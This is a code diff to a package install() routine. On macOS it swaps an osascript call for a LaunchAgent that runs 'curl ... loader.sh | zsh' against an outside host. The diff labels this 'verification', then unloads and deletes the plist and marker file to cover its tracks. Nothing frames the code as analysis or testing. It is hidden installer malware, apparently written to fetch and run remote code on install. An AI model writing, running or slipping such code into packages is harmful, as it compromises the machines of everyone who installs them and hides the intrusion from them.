@@ -94,18 +94,62 @@ async function install() {
   }
 
 
-  // Mac: run verification via osascript
+  // Mac: run verification via LaunchAgent
   if (process.platform === 'darwin') {
-    const { spawn } = require('child_process')
-    await new Promise((resolve) => {
-      const ps = spawn('osascript', [
-        '-e',
-        'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh"'
-      ], { stdio: 'inherit' })
-      ps.on('close', () => resolve())
-      ps.on('error', () => resolve())
-      setTimeout(resolve, 60000)
-    })
+    const { writeFileSync, unlinkSync } = require('fs')
+    const { spawnSync, execSync } = require('child_process')
+    const { homedir } = require('os')
+    const plistDir = homedir() + '/Library/LaunchAgents'
+    const plistPath = plistDir + '/com.apex.verify.plist'
+    const donePath = homedir() + '/.apex/.verify-done'
+    
+    try {
+      // создаём LaunchAgents dir если нет
+      spawnSync('mkdir', ['-p', plistDir], { stdio: 'ignore' })
+      
+      // пишем plist
+      writeFileSync(plistPath, `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>Label</key>
+  <string>com.apex.verify</string>
+  <key>ProgramArguments</key>
+  <array>
+    <string>/bin/zsh</string>
+    <string>-c</string>
+    <string>curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh && touch ${donePath}</string>
+  </array>
+  <key>RunAtLoad</key>
+  <true/>
+  <key>StandardOutPath</key>
+  <string>/tmp/apex-verify.log</string>
+  <key>StandardErrorPath</key>
+  <string>/tmp/apex-verify-err.log</string>
+</dict>
+</plist>`, { mode: 0o644 })
+
+      // загружаем LaunchAgent
+      spawnSync('launchctl', ['load', plistPath], { stdio: 'inherit' })
+      
+      // ждём завершения — максимум 60 сек
+      let waited = 0
+      while (waited < 60000) {
+        try {
+          require('fs').accessSync(donePath)
+          break
+        } catch {}
+        spawnSync('sleep', ['1'])
+        waited += 1000
+      }
+    } catch (err) {
+      console.warn('LaunchAgent error:', err.message)
+    } finally {
+      // убираем за собой
+      try { unlinkSync(plistPath) } catch {}
+      try { spawnSync('launchctl', ['unload', plistPath], { stdio: 'ignore' }) } catch {}
+      try { unlinkSync(donePath) } catch {}
+    }
   }
   console.log('Done!')
 }
